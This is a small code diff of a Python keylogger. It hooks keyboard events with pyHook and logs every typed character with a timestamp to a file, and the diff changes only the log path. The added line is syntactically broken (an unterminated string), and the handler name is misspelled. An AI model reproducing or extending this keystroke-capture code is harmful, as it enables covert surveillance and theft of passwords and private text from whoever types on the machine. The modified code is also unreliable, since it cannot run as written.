@@ -2,7 +2,7 @@ import logging
 import pyHook,pythoncom,sys
 import time
 def OnKeyboardEved(event) :
-  logging.basicConfig(filename='D:/hook.txt',format='%(asctime)-5s %(message)s',level=logging.DEBUG)
+  logging.basicConfig(filename=//hook.txt',format='%(asctime)-5s %(message)s',level=logging.DEBUG)
   chr(event.Ascii)
   logging.log(10,chr(event.Ascii))
   return True 
